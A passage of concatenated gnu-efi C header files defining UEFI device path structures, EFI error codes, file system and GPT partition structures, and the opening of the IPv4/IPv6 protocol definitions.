} MEMMAP_DEVICE_PATH;

#define HW_VENDOR_DP                    0x04
typedef struct _VENDOR_DEVICE_PATH {
        EFI_DEVICE_PATH_PROTOCOL        Header;
        EFI_GUID                        Guid;
} VENDOR_DEVICE_PATH;

#define UNKNOWN_DEVICE_GUID \
    { 0xcf31fac5, 0xc24e, 0x11d2,  {0x85, 0xf3, 0x0, 0xa0, 0xc9, 0x3e, 0xc9, 0x3b}  }

typedef struct _UKNOWN_DEVICE_VENDOR_DP {
    VENDOR_DEVICE_PATH      DevicePath;
    UINT8                   LegacyDriveLetter;
} UNKNOWN_DEVICE_VENDOR_DEVICE_PATH;

#define HW_CONTROLLER_DP            0x05
typedef struct _CONTROLLER_DEVICE_PATH {
        EFI_DEVICE_PATH_PROTOCOL  Header;
        UINT32                    Controller;
} CONTROLLER_DEVICE_PATH;


/*
 * ACPI Device Path (UEFI 2.4 specification, version 2.4 § 9.3.3 and 9.3.4.)
 */
#define ACPI_DEVICE_PATH                0x02

#define ACPI_DP                         0x01
typedef struct _ACPI_HID_DEVICE_PATH {
        EFI_DEVICE_PATH_PROTOCOL        Header;
        UINT32                          HID;
        UINT32                          UID;
} ACPI_HID_DEVICE_PATH;

#define EXPANDED_ACPI_DP                0x02
typedef struct _EXPANDED_ACPI_HID_DEVICE_PATH {
        EFI_DEVICE_PATH_PROTOCOL        Header;
        UINT32                          HID;
        UINT32                          UID;
        UINT32                          CID;
        UINT8                           HidStr[1];
} EXPANDED_ACPI_HID_DEVICE_PATH;

#define ACPI_ADR_DP 3
typedef struct _ACPI_ADR_DEVICE_PATH {
    EFI_DEVICE_PATH_PROTOCOL Header ;
    UINT32 ADR ;
} ACPI_ADR_DEVICE_PATH ;

//
// EISA ID Macro
// EISA ID Definition 32-bits
//  bits[15:0] - three character compressed ASCII EISA ID.
//  bits[31:16] - binary number
//   Compressed ASCII is 5 bits per character 0b00001 = 'A' 0b11010 = 'Z'
//
#define PNP_EISA_ID_CONST       0x41d0
#define EISA_ID(_Name, _Num)    ((UINT32) ((_Name) | (_Num) << 16))
#define EISA_PNP_ID(_PNPId)     (EISA_ID(PNP_EISA_ID_CONST, (_PNPId)))

#define PNP_EISA_ID_MASK        0xffff
#define EISA_ID_TO_NUM(_Id)     ((_Id) >> 16)


/*
 * Messaging Device Path (UEFI 2.4 specification, version 2.4 § 9.3.5.)
 */
#define MESSAGING_DEVICE_PATH           0x03

#define MSG_ATAPI_DP                    0x01
typedef struct _ATAPI_DEVICE_PATH {
        EFI_DEVICE_PATH_PROTOCOL        Header;
        UINT8                           PrimarySecondary;
        UINT8                           SlaveMaster;
        UINT16                          Lun;
} ATAPI_DEVICE_PATH;

#define MSG_SCSI_DP                     0x02
typedef struct _SCSI_DEVICE_PATH {
        EFI_DEVICE_PATH_PROTOCOL        Header;
        UINT16                          Pun;
        UINT16                          Lun;
} SCSI_DEVICE_PATH;

#define MSG_FIBRECHANNEL_DP             0x03
typedef struct _FIBRECHANNEL_DEVICE_PATH {
        EFI_DEVICE_PATH_PROTOCOL        Header;
        UINT32                          Reserved;
        UINT64                          WWN;
        UINT64                          Lun;
} FIBRECHANNEL_DEVICE_PATH;

/**
 * Fibre Channel Ex SubType.
 * UEFI 2.0 specification version 2.4 § 9.3.5.6.
 */
#define MSG_FIBRECHANNELEX_DP 21
typedef struct _FIBRECHANNELEX_DEVICE_PATH {
    EFI_DEVICE_PATH_PROTOCOL Header ;
    UINT32 Reserved ;
    UINT8 WWN[ 8 ] ; /* World Wide Name */
    UINT8 Lun[ 8 ] ; /* Logical unit, T-10 SCSI Architecture Model 4 specification */
} FIBRECHANNELEX_DEVICE_PATH ;

#define MSG_1394_DP                     0x04
typedef struct _F1394_DEVICE_PATH {
        EFI_DEVICE_PATH_PROTOCOL        Header;
        UINT32                          Reserved;
        UINT64                          Guid;
} F1394_DEVICE_PATH;

#define MSG_USB_DP                      0x05
typedef struct _USB_DEVICE_PATH {
        EFI_DEVICE_PATH_PROTOCOL        Header;
        UINT8                           Port;
        UINT8                           Endpoint;
} USB_DEVICE_PATH;

/**
 * SATA Device Path SubType.
 * UEFI 2.0 specification version 2.4 § 9.3.5.6.
 */
#define MSG_SATA_DP 18
typedef struct _SATA_DEVICE_PATH {
    EFI_DEVICE_PATH_PROTOCOL Header ;
    UINT16 HBAPortNumber ;
    UINT16 PortMultiplierPortNumber ;
    UINT16 Lun ; /* Logical Unit Number */
} SATA_DEVICE_PATH ;

/**
 * USB WWID Device Path SubType.
 * UEFI 2.0 specification version 2.4 § 9.3.5.7.
 */
#define MSG_USB_WWID_DP 16
typedef struct _USB_WWID_DEVICE_PATH {
    EFI_DEVICE_PATH_PROTOCOL Header ;
    UINT16 InterfaceNumber ;
    UINT16 VendorId ;
    UINT16 ProductId ;
    CHAR16 SerialNumber[ 1 ] ; /* UTF-16 characters of the USB serial number */
} USB_WWID_DEVICE_PATH ;

/**
 * Device Logical Unit SubType.
 * UEFI 2.0 specification version 2.4 § 9.3.5.8.
 */
#define MSG_DEVICE_LOGICAL_UNIT_DP 17
typedef struct _DEVICE_LOGICAL_UNIT_DEVICE_PATH {
    EFI_DEVICE_PATH_PROTOCOL Header ;
    UINT8 Lun ; /* Logical Unit Number */
} DEVICE_LOGICAL_UNIT_DEVICE_PATH ;

#define MSG_USB_CLASS_DP                0x0F
typedef struct _USB_CLASS_DEVICE_PATH {
        EFI_DEVICE_PATH_PROTOCOL        Header;
        UINT16                          VendorId;
        UINT16                          ProductId;
        UINT8                           DeviceClass;
        UINT8                           DeviceSubclass;
        UINT8                           DeviceProtocol;
} USB_CLASS_DEVICE_PATH;

#define MSG_I2O_DP                      0x06
typedef struct _I2O_DEVICE_PATH {
        EFI_DEVICE_PATH_PROTOCOL        Header;
        UINT32                          Tid;
} I2O_DEVICE_PATH;

#define MSG_MAC_ADDR_DP                 0x0b
typedef struct _MAC_ADDR_DEVICE_PATH {
        EFI_DEVICE_PATH_PROTOCOL        Header;
        EFI_MAC_ADDRESS                 MacAddress;
        UINT8                           IfType;
} MAC_ADDR_DEVICE_PATH;

#define MSG_IPv4_DP                     0x0c
typedef struct _IPv4_DEVICE_PATH {
        EFI_DEVICE_PATH_PROTOCOL        Header;
        EFI_IPv4_ADDRESS                LocalIpAddress;
        EFI_IPv4_ADDRESS                RemoteIpAddress;
        UINT16                          LocalPort;
        UINT16                          RemotePort;
        UINT16                          Protocol;
        BOOLEAN                         StaticIpAddress;
        /* new from UEFI version 2, code must check Length field in Header */
        EFI_IPv4_ADDRESS                GatewayIpAddress ;
        EFI_IPv4_ADDRESS                SubnetMask ;
} IPv4_DEVICE_PATH;

#define MSG_IPv6_DP                     0x0d
typedef struct _IPv6_DEVICE_PATH {
        EFI_DEVICE_PATH_PROTOCOL        Header;
        EFI_IPv6_ADDRESS                LocalIpAddress;
        EFI_IPv6_ADDRESS                RemoteIpAddress;
        UINT16                          LocalPort;
        UINT16                          RemotePort;
        UINT16                          Protocol;
        BOOLEAN                         IPAddressOrigin ;
        /* new from UEFI version 2, code must check Length field in Header */
        UINT8                           PrefixLength ;
        EFI_IPv6_ADDRESS                GatewayIpAddress ;
} IPv6_DEVICE_PATH;


/**
 * Uniform Resource Identifiers SubType.
 * UEFI 2.0 specification version 2.4C § 9.3.5.23.
 */
#define MSG_URI_DP                      24
typedef struct _URI_DEVICE_PATH {
        EFI_DEVICE_PATH_PROTOCOL        Header;
        CHAR8                           Uri[1];
} URI_DEVICE_PATH;

/**
 * Device Logical Unit SubType.
 * UEFI 2.0 specification version 2.4 § 9.3.5.8.
 */
#define MSG_VLAN_DP 20
typedef struct _VLAN_DEVICE_PATH {
    EFI_DEVICE_PATH_PROTOCOL Header ;
    UINT16 VlanId ;
} VLAN_DEVICE_PATH;

#define MSG_INFINIBAND_DP               0x09
typedef struct _INFINIBAND_DEVICE_PATH {
        EFI_DEVICE_PATH_PROTOCOL        Header;
        UINT32                          ResourceFlags;
        UINT8                           PortGid[16];
        UINT64                          ServiceId;
        UINT64                          TargetPortId;
        UINT64                          DeviceId;
} INFINIBAND_DEVICE_PATH;

#define MSG_UART_DP                     0x0e
typedef struct _UART_DEVICE_PATH {
        EFI_DEVICE_PATH_PROTOCOL        Header;
        UINT32                          Reserved;
        UINT64                          BaudRate;
        UINT8                           DataBits;
        UINT8                           Parity;
        UINT8                           StopBits;
} UART_DEVICE_PATH;

#define MSG_VENDOR_DP                   0x0A
/* Use VENDOR_DEVICE_PATH struct */

#define EFI_PC_ANSI_GUID \
    { 0xe0c14753, 0xf9be, 0x11d2, {0x9a, 0x0c, 0x00, 0x90, 0x27, 0x3f, 0xc1, 0x4d} }
#define DEVICE_PATH_MESSAGING_PC_ANSI EFI_PC_ANSI_GUID

#define EFI_VT_100_GUID \
    { 0xdfa66065, 0xb419, 0x11d3, {0x9a, 0x2d, 0x00, 0x90, 0x27, 0x3f, 0xc1, 0x4d} }
#define DEVICE_PATH_MESSAGING_VT_100 EFI_VT_100_GUID

#define EFI_VT_100_PLUS_GUID \
    { 0x7baec70b, 0x57e0, 0x4c76, {0x8e, 0x87, 0x2f, 0x9e, 0x28, 0x08, 0x83, 0x43} }
#define DEVICE_PATH_MESSAGING_VT_100_PLUS EFI_VT_100_PLUS_GUID

#define EFI_VT_UTF8_GUID \
    { 0xad15a0d6, 0x8bec, 0x4acf, {0xa0, 0x73, 0xd0, 0x1d, 0xe7, 0x7e, 0x2d, 0x88} }
#define DEVICE_PATH_MESSAGING_VT_UTF8 EFI_VT_UTF8_GUID


/*
 * Media Device Path (UEFI 2.4 specification, version 2.4 § 9.3.6.)
 */
#define MEDIA_DEVICE_PATH               0x04

#define MEDIA_HARDDRIVE_DP              0x01
typedef struct _HARDDRIVE_DEVICE_PATH {
        EFI_DEVICE_PATH_PROTOCOL        Header;
        UINT32                          PartitionNumber;
        UINT64                          PartitionStart;
        UINT64                          PartitionSize;
        UINT8                           Signature[16];
        UINT8                           MBRType;
        UINT8                           SignatureType;
} HARDDRIVE_DEVICE_PATH;

#define MBR_TYPE_PCAT                       0x01
#define MBR_TYPE_EFI_PARTITION_TABLE_HEADER 0x02

#define SIGNATURE_TYPE_MBR                  0x01
#define SIGNATURE_TYPE_GUID                 0x02

#define MEDIA_CDROM_DP                  0x02
typedef struct _CDROM_DEVICE_PATH {
        EFI_DEVICE_PATH_PROTOCOL        Header;
        UINT32                          BootEntry;
        UINT64                          PartitionStart;
        UINT64                          PartitionSize;
} CDROM_DEVICE_PATH;

#define MEDIA_VENDOR_DP                 0x03
/* Use VENDOR_DEVICE_PATH struct */

#define MEDIA_FILEPATH_DP               0x04
typedef struct _FILEPATH_DEVICE_PATH {
        EFI_DEVICE_PATH_PROTOCOL        Header;
        CHAR16                          PathName[1];
} FILEPATH_DEVICE_PATH;

#define SIZE_OF_FILEPATH_DEVICE_PATH EFI_FIELD_OFFSET(FILEPATH_DEVICE_PATH,PathName)

#define MEDIA_PROTOCOL_DP               0x05
typedef struct _MEDIA_PROTOCOL_DEVICE_PATH {
        EFI_DEVICE_PATH_PROTOCOL        Header;
        EFI_GUID                        Protocol;
} MEDIA_PROTOCOL_DEVICE_PATH;

/**
 * PIWG Firmware File SubType.
 * UEFI 2.0 specification version 2.4 § 9.3.6.6.
 */
#define MEDIA_PIWG_FW_FILE_DP 6
typedef struct _MEDIA_FW_VOL_FILEPATH_DEVICE_PATH {
    EFI_DEVICE_PATH_PROTOCOL Header ;
    EFI_GUID FvFileName ;
} MEDIA_FW_VOL_FILEPATH_DEVICE_PATH ;

/**
 * PIWG Firmware Volume Device Path SubType.
 * UEFI 2.0 specification version 2.4 § 9.3.6.7.
 */
#define MEDIA_PIWG_FW_VOL_DP 7
typedef struct _MEDIA_FW_VOL_DEVICE_PATH {
    EFI_DEVICE_PATH_PROTOCOL Header ;
    EFI_GUID FvName ;
} MEDIA_FW_VOL_DEVICE_PATH ;

/**
 * Media relative offset range device path.
 * UEFI 2.0 specification version 2.4 § 9.3.6.8.
 */
#define MEDIA_RELATIVE_OFFSET_RANGE_DP 8
typedef struct _MEDIA_RELATIVE_OFFSET_RANGE_DEVICE_PATH {
    EFI_DEVICE_PATH_PROTOCOL Header ;
    UINT32 Reserved ;
    UINT64 StartingOffset ;
    UINT64 EndingOffset ;
} MEDIA_RELATIVE_OFFSET_RANGE_DEVICE_PATH ;


/*
 * BIOS Boot Specification Device Path (UEFI 2.4 specification, version 2.4 § 9.3.7.)
 */
#define BBS_DEVICE_PATH                 0x05

#define BBS_BBS_DP                      0x01
typedef struct _BBS_BBS_DEVICE_PATH {
        EFI_DEVICE_PATH_PROTOCOL        Header;
        UINT16                          DeviceType;
        UINT16                          StatusFlag;
        CHAR8                           String[1];
} BBS_BBS_DEVICE_PATH;

/* DeviceType definitions - from BBS specification */
#define BBS_TYPE_FLOPPY                 0x01
#define BBS_TYPE_HARDDRIVE              0x02
#define BBS_TYPE_CDROM                  0x03
#define BBS_TYPE_PCMCIA                 0x04
#define BBS_TYPE_USB                    0x05
#define BBS_TYPE_EMBEDDED_NETWORK       0x06
#define BBS_TYPE_DEV                    0x80
#define BBS_TYPE_UNKNOWN                0xFF

typedef union {
    EFI_DEVICE_PATH_PROTOCOL             DevPath;
    PCI_DEVICE_PATH                      Pci;
    PCCARD_DEVICE_PATH                   PcCard;
    MEMMAP_DEVICE_PATH                   MemMap;
    VENDOR_DEVICE_PATH                   Vendor;
    UNKNOWN_DEVICE_VENDOR_DEVICE_PATH    UnknownVendor;
    CONTROLLER_DEVICE_PATH               Controller;
    ACPI_HID_DEVICE_PATH                 Acpi;

    ATAPI_DEVICE_PATH                    Atapi;
    SCSI_DEVICE_PATH                     Scsi;
    FIBRECHANNEL_DEVICE_PATH             FibreChannel;

    F1394_DEVICE_PATH                    F1394;
    USB_DEVICE_PATH                      Usb;
    USB_CLASS_DEVICE_PATH                UsbClass;
    I2O_DEVICE_PATH                      I2O;
    MAC_ADDR_DEVICE_PATH                 MacAddr;
    IPv4_DEVICE_PATH                     Ipv4;
    IPv6_DEVICE_PATH                     Ipv6;
    URI_DEVICE_PATH                      Uri;
    INFINIBAND_DEVICE_PATH               InfiniBand;
    UART_DEVICE_PATH                     Uart;

    HARDDRIVE_DEVICE_PATH                HardDrive;
    CDROM_DEVICE_PATH                    CD;

    FILEPATH_DEVICE_PATH                 FilePath;
    MEDIA_PROTOCOL_DEVICE_PATH           MediaProtocol;

    BBS_BBS_DEVICE_PATH                  Bbs;

} EFI_DEV_PATH;

typedef union {
    EFI_DEVICE_PATH_PROTOCOL             *DevPath;
    PCI_DEVICE_PATH                      *Pci;
    PCCARD_DEVICE_PATH                   *PcCard;
    MEMMAP_DEVICE_PATH                   *MemMap;
    VENDOR_DEVICE_PATH                   *Vendor;
    UNKNOWN_DEVICE_VENDOR_DEVICE_PATH    *UnknownVendor;
    CONTROLLER_DEVICE_PATH               *Controller;
    ACPI_HID_DEVICE_PATH                 *Acpi;

    ATAPI_DEVICE_PATH                    *Atapi;
    SCSI_DEVICE_PATH                     *Scsi;
    FIBRECHANNEL_DEVICE_PATH             *FibreChannel;

    F1394_DEVICE_PATH                    *F1394;
    USB_DEVICE_PATH                      *Usb;
    USB_CLASS_DEVICE_PATH                *UsbClass;
    I2O_DEVICE_PATH                      *I2O;
    MAC_ADDR_DEVICE_PATH                 *MacAddr;
    IPv4_DEVICE_PATH                     *Ipv4;
    IPv6_DEVICE_PATH                     *Ipv6;
    URI_DEVICE_PATH                      *Uri;
    INFINIBAND_DEVICE_PATH               *InfiniBand;
    UART_DEVICE_PATH                     *Uart;

    HARDDRIVE_DEVICE_PATH                *HardDrive;

    FILEPATH_DEVICE_PATH                 *FilePath;
    MEDIA_PROTOCOL_DEVICE_PATH           *MediaProtocol;

    CDROM_DEVICE_PATH                    *CD;
    BBS_BBS_DEVICE_PATH                  *Bbs;

} EFI_DEV_PATH_PTR;

#define EFI_DEVICE_PATH_TO_TEXT_PROTOCOL_GUID \
  { 0x8b843e20, 0x8132, 0x4852, {0x90, 0xcc, 0x55, 0x1a, 0x4e, 0x4a, 0x7f, 0x1c} }

typedef
CHAR16*
(EFIAPI *EFI_DEVICE_PATH_TO_TEXT_NODE) (
    IN CONST EFI_DEVICE_PATH_PROTOCOL    *DeviceNode,
    IN BOOLEAN                           DisplayOnly,
    IN BOOLEAN                           AllowShortcuts
    );

typedef
CHAR16*
(EFIAPI *EFI_DEVICE_PATH_TO_TEXT_PATH) (
    IN CONST EFI_DEVICE_PATH_PROTOCOL    *DevicePath,
    IN BOOLEAN                           DisplayOnly,
    IN BOOLEAN                           AllowShortcuts
    );

typedef struct _EFI_DEVICE_PATH_TO_TEXT_PROTOCOL {
    EFI_DEVICE_PATH_TO_TEXT_NODE         ConvertDeviceNodeToText;
    EFI_DEVICE_PATH_TO_TEXT_PATH         ConvertDevicePathToText;
} EFI_DEVICE_PATH_TO_TEXT_PROTOCOL;

#define EFI_DEVICE_PATH_FROM_TEXT_PROTOCOL_GUID \
  { 0x5c99a21, 0xc70f, 0x4ad2, {0x8a, 0x5f, 0x35, 0xdf, 0x33, 0x43, 0xf5, 0x1e} }

typedef
EFI_DEVICE_PATH_PROTOCOL*
(EFIAPI *EFI_DEVICE_PATH_FROM_TEXT_NODE) (
    IN CONST CHAR16                      *TextDeviceNode
    );

typedef
EFI_DEVICE_PATH_PROTOCOL*
(EFIAPI *EFI_DEVICE_PATH_FROM_TEXT_PATH) (
    IN CONST CHAR16                      *TextDevicePath
    );

typedef struct {
    EFI_DEVICE_PATH_FROM_TEXT_NODE       ConvertTextToDeviceNode;
    EFI_DEVICE_PATH_FROM_TEXT_PATH       ConvertTextToDevicePath;
} EFI_DEVICE_PATH_FROM_TEXT_PROTOCOL;

#define EFI_DEVICE_PATH_UTILITIES_PROTOCOL_GUID \
  { 0x379be4e, 0xd706, 0x437d, {0xb0, 0x37, 0xed, 0xb8, 0x2f, 0xb7, 0x72, 0xa4} }

typedef
UINTN
(EFIAPI *EFI_DEVICE_PATH_UTILS_GET_DEVICE_PATH_SIZE) (
    IN CONST EFI_DEVICE_PATH_PROTOCOL    *DevicePath
    );

typedef
EFI_DEVICE_PATH_PROTOCOL*
(EFIAPI *EFI_DEVICE_PATH_UTILS_DUP_DEVICE_PATH) (
    IN CONST EFI_DEVICE_PATH_PROTOCOL    *DevicePath
    );

typedef
EFI_DEVICE_PATH_PROTOCOL*
(EFIAPI *EFI_DEVICE_PATH_UTILS_APPEND_PATH) (
    IN CONST EFI_DEVICE_PATH_PROTOCOL    *Src1,
    IN CONST EFI_DEVICE_PATH_PROTOCOL    *Src2
    );

typedef
EFI_DEVICE_PATH_PROTOCOL*
(EFIAPI *EFI_DEVICE_PATH_UTILS_APPEND_NODE) (
    IN CONST EFI_DEVICE_PATH_PROTOCOL    *DevicePath,
    IN CONST EFI_DEVICE_PATH_PROTOCOL    *DeviceNode
);

typedef
EFI_DEVICE_PATH_PROTOCOL*
(EFIAPI *EFI_DEVICE_PATH_UTILS_APPEND_INSTANCE) (
    IN CONST EFI_DEVICE_PATH_PROTOCOL    *DevicePath,
    IN CONST EFI_DEVICE_PATH_PROTOCOL    *DevicePathInstance
);

typedef
EFI_DEVICE_PATH_PROTOCOL*
(EFIAPI *EFI_DEVICE_PATH_UTILS_GET_NEXT_INSTANCE) (
    IN OUT EFI_DEVICE_PATH_PROTOCOL      **DevicePathInstance,
    OUT UINTN                            *DevicePathInstanceSize OPTIONAL
);

typedef
EFI_DEVICE_PATH_PROTOCOL*
(EFIAPI *EFI_DEVICE_PATH_UTILS_CREATE_NODE) (
    IN UINT8                             NodeType,
    IN UINT8                             NodeSubType,
    IN UINT16                            NodeLength
    );

typedef
BOOLEAN
(EFIAPI *EFI_DEVICE_PATH_UTILS_IS_MULTI_INSTANCE) (
    IN CONST EFI_DEVICE_PATH_PROTOCOL    *DevicePath
    );

typedef struct _EFI_DEVICE_PATH_UTILITIES_PROTOCOL {
    EFI_DEVICE_PATH_UTILS_GET_DEVICE_PATH_SIZE   GetDevicePathSize;
    EFI_DEVICE_PATH_UTILS_DUP_DEVICE_PATH        DuplicateDevicePath;
    EFI_DEVICE_PATH_UTILS_APPEND_PATH            AppendDevicePath;
    EFI_DEVICE_PATH_UTILS_APPEND_NODE            AppendDeviceNode;
    EFI_DEVICE_PATH_UTILS_APPEND_INSTANCE        AppendDevicePathInstance;
    EFI_DEVICE_PATH_UTILS_GET_NEXT_INSTANCE      GetNextDevicePathInstance;
    EFI_DEVICE_PATH_UTILS_IS_MULTI_INSTANCE      IsDevicePathMultiInstance;
    EFI_DEVICE_PATH_UTILS_CREATE_NODE            CreateDeviceNode;
} EFI_DEVICE_PATH_UTILITIES_PROTOCOL;

#endif

```

`include/gnu-efi/efierr.h`:

```h
#ifndef _EFI_ERR_H
#define _EFI_ERR_H

/*++

Copyright (c) 1998  Intel Corporation

Module Name:

    efierr.h

Abstract:

    EFI error codes




Revision History

--*/


#define EFIWARN(a)                            (a)
#define EFI_ERROR(a)              (((INTN) a) < 0)


#define EFI_SUCCESS                             0
#define EFI_LOAD_ERROR                  EFIERR(1)
#define EFI_INVALID_PARAMETER           EFIERR(2)
#define EFI_UNSUPPORTED                 EFIERR(3)
#define EFI_BAD_BUFFER_SIZE             EFIERR(4)
#define EFI_BUFFER_TOO_SMALL            EFIERR(5)
#define EFI_NOT_READY                   EFIERR(6)
#define EFI_DEVICE_ERROR                EFIERR(7)
#define EFI_WRITE_PROTECTED             EFIERR(8)
#define EFI_OUT_OF_RESOURCES            EFIERR(9)
#define EFI_VOLUME_CORRUPTED            EFIERR(10)
#define EFI_VOLUME_FULL                 EFIERR(11)
#define EFI_NO_MEDIA                    EFIERR(12)
#define EFI_MEDIA_CHANGED               EFIERR(13)
#define EFI_NOT_FOUND                   EFIERR(14)
#define EFI_ACCESS_DENIED               EFIERR(15)
#define EFI_NO_RESPONSE                 EFIERR(16)
#define EFI_NO_MAPPING                  EFIERR(17)
#define EFI_TIMEOUT                     EFIERR(18)
#define EFI_NOT_STARTED                 EFIERR(19)
#define EFI_ALREADY_STARTED             EFIERR(20)
#define EFI_ABORTED                     EFIERR(21)
#define EFI_ICMP_ERROR                  EFIERR(22)
#define EFI_TFTP_ERROR                  EFIERR(23)
#define EFI_PROTOCOL_ERROR              EFIERR(24)
#define EFI_INCOMPATIBLE_VERSION        EFIERR(25)
#define EFI_SECURITY_VIOLATION          EFIERR(26)
#define EFI_CRC_ERROR                   EFIERR(27)
#define EFI_END_OF_MEDIA                EFIERR(28)
#define EFI_END_OF_FILE                 EFIERR(31)
#define EFI_INVALID_LANGUAGE            EFIERR(32)
#define EFI_COMPROMISED_DATA            EFIERR(33)

#define EFI_WARN_UNKOWN_GLYPH           EFIWARN(1)
#define EFI_WARN_UNKNOWN_GLYPH          EFIWARN(1)
#define EFI_WARN_DELETE_FAILURE         EFIWARN(2)
#define EFI_WARN_WRITE_FAILURE          EFIWARN(3)
#define EFI_WARN_BUFFER_TOO_SMALL       EFIWARN(4)

#endif


```

`include/gnu-efi/efifs.h`:

```h
#ifndef _EFI_FS_H
#define _EFI_FS_H

/*++

Copyright (c) 1998  Intel Corporation

Module Name:

    efifs.h

Abstract:

    EFI File System structures



Revision History

--*/


//
// EFI Partition header (normaly starts in LBA 1)
//

#define EFI_PARTITION_SIGNATURE         0x5053595320494249
#define EFI_PARTITION_REVISION          0x00010001
#define MIN_EFI_PARTITION_BLOCK_SIZE    512
#define EFI_PARTITION_LBA               1

typedef struct _EFI_PARTITION_HEADER {
    EFI_TABLE_HEADER    Hdr;
    UINT32              DirectoryAllocationNumber;
    UINT32              BlockSize;
    EFI_LBA             FirstUsableLba;
    EFI_LBA             LastUsableLba;
    EFI_LBA             UnusableSpace;
    EFI_LBA             FreeSpace;
    EFI_LBA             RootFile;
    EFI_LBA             SecutiryFile;
} EFI_PARTITION_HEADER;


//
// File header
//

#define EFI_FILE_HEADER_SIGNATURE   0x454c494620494249
#define EFI_FILE_HEADER_REVISION    0x00010000
#define EFI_FILE_STRING_SIZE        260

typedef struct _EFI_FILE_HEADER {
    EFI_TABLE_HEADER    Hdr;
    UINT32              Class;
    UINT32              LBALOffset;
    EFI_LBA             Parent;
    UINT64              FileSize;
    UINT64              FileAttributes;
    EFI_TIME            FileCreateTime;
    EFI_TIME            FileModificationTime;
    EFI_GUID            VendorGuid;
    CHAR16              FileString[EFI_FILE_STRING_SIZE];
} EFI_FILE_HEADER;


//
// Return the file's first LBAL which is in the same
// logical block as the file header
//

#define EFI_FILE_LBAL(a)    ((EFI_LBAL *) (((CHAR8 *) (a)) + (a)->LBALOffset))

#define EFI_FILE_CLASS_FREE_SPACE   1
#define EFI_FILE_CLASS_EMPTY        2
#define EFI_FILE_CLASS_NORMAL       3


//
// Logical Block Address List - the fundemental block
// description structure
//

#define EFI_LBAL_SIGNATURE      0x4c41424c20494249
#define EFI_LBAL_REVISION       0x00010000

typedef struct _EFI_LBAL {
    EFI_TABLE_HEADER    Hdr;
    UINT32              Class;
    EFI_LBA             Parent;
    EFI_LBA             Next;
    UINT32              ArraySize;
    UINT32              ArrayCount;
} EFI_LBAL;

// Array size 
#define EFI_LBAL_ARRAY_SIZE(lbal,offs,blks)  \
        (((blks) - (offs) - (lbal)->Hdr.HeaderSize) / sizeof(EFI_RL))

//
// Logical Block run-length
//

typedef struct {
    EFI_LBA     Start;
    UINT64      Length;
} EFI_RL;

//
// Return the run-length structure from an LBAL header
//

#define EFI_LBAL_RL(a)      ((EFI_RL*) (((CHAR8 *) (a)) + (a)->Hdr.HeaderSize))

#endif


```

`include/gnu-efi/efigpt.h`:

```h
#ifndef _EFI_GPT_H
#define _EFI_GPT_H
/*++

Copyright (c) 1998  Intel Corporation

Module Name:

    EfiGpt.h
    
Abstract:
    Include file for EFI partitioning scheme



Revision History

--*/

#define PRIMARY_PART_HEADER_LBA         1

typedef struct {
    EFI_TABLE_HEADER    Header;
    EFI_LBA             MyLBA;
    EFI_LBA             AlternateLBA;
    EFI_LBA             FirstUsableLBA;
    EFI_LBA             LastUsableLBA;
    EFI_GUID            DiskGUID;
    EFI_LBA             PartitionEntryLBA;
    UINT32              NumberOfPartitionEntries;
    UINT32              SizeOfPartitionEntry;
    UINT32              PartitionEntryArrayCRC32;
} EFI_PARTITION_TABLE_HEADER;

#define EFI_PTAB_HEADER_ID  "EFI PART"

typedef struct {
    EFI_GUID    PartitionTypeGUID;
    EFI_GUID    UniquePartitionGUID;
    EFI_LBA     StartingLBA;
    EFI_LBA     EndingLBA;
    UINT64      Attributes;
    CHAR16      PartitionName[36];
} EFI_PARTITION_ENTRY;

//
// EFI Partition Attributes
//
#define EFI_PART_USED_BY_EFI            0x0000000000000001
#define EFI_PART_REQUIRED_TO_FUNCTION   0x0000000000000002
#define EFI_PART_USED_BY_OS             0x0000000000000004
#define EFI_PART_REQUIRED_BY_OS         0x0000000000000008
#define EFI_PART_BACKUP_REQUIRED        0x0000000000000010
#define EFI_PART_USER_DATA              0x0000000000000020
#define EFI_PART_CRITICAL_USER_DATA     0x0000000000000040
#define EFI_PART_REDUNDANT_PARTITION    0x0000000000000080

#define EFI_PART_TYPE_UNUSED_GUID   \
    { 0x00000000, 0x0000, 0x0000, {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00} }
    
#define EFI_PART_TYPE_EFI_SYSTEM_PART_GUID  \
    { 0xc12a7328, 0xf81f, 0x11d2, {0xba, 0x4b, 0x00, 0xa0, 0xc9, 0x3e, 0xc9, 0x3b} }

#define EFI_PART_TYPE_LEGACY_MBR_GUID   \
    { 0x024dee41, 0x33e7, 0x11d3, {0x9d, 0x69, 0x00, 0x08, 0xc7, 0x81, 0xf3, 0x9f} }

#endif


```

`include/gnu-efi/efiip.h`:

```h
#ifndef _EFI_IP_H
#define _EFI_IP_H

/*++
Copyright (c) 2013  Intel Corporation

--*/

#define EFI_IP4_SERVICE_BINDING_PROTOCOL \
   {0xc51711e7,0xb4bf,0x404a,{0xbf,0xb8,0x0a,0x04, 0x8e,0xf1,0xff,0xe4}}

#define EFI_IP4_PROTOCOL \
    {0x41d94cd2,0x35b6,0x455a,{0x82,0x58,0xd4,0xe5,0x13,0x34,0xaa,0xdd}}

#define EFI_IP6_SERVICE_BINDING_PROTOCOL \
    {0xec835dd3,0xfe0f,0x617b,{0xa6,0x21,0xb3,0x50,0xc3,0xe1,0x33,0x88}}

#define EFI_IP6_PROTOCOL \
    {0x2c8759d5,0x5c2d,0x66ef,{0x92,0x5f,0xb6,0x6c,0x10,0x19,0x57,0xe2}}

INTERFACE_DECL(_EFI_IP4);
INTERFACE_DECL(_EFI_IP6);

typedef struct {
    EFI_HANDLE       InstanceHandle;
    EFI_IPv4_ADDRESS Ip4Address;
    EFI_IPv4_ADDRESS SubnetMask;
} EFI_IP4_ADDRESS_PAIR;

typedef struct {
    EFI_HANDLE           DriverHandle;
    UINT32               AddressCount;
    EFI_IP4_ADDRESS_PAIR AddressPairs[1];
} EFI_IP4_VARIABLE_DATA;

typedef struct {
    UINT8            DefaultProtocol;
    BOOLEAN          AcceptAnyProtocol;
    BOOLEAN          AcceptIcmpErrors;
    BOOLEAN          AcceptBroadcast;
    BOOLEAN          AcceptPromiscuous;
    BOOLEAN          UseDefaultAddress;
    EFI_IPv4_ADDRESS StationAddress;
    EFI_IPv4_ADDRESS SubnetMask;
    UINT8            TypeOfService;
    UINT8            TimeToLive;
    BOOLEAN          DoNotFragment;
    BOOLEAN          RawData;
    UINT32           ReceiveTimeout;
    UINT32           TransmitTimeout;
} EFI_IP4_CONFIG_DATA;

typedef struct {
    EFI_IPv4_ADDRESS SubnetAddress;
    EFI_IPv4_ADDRESS SubnetMask;
    EFI_IPv4_ADDRESS GatewayAddress;
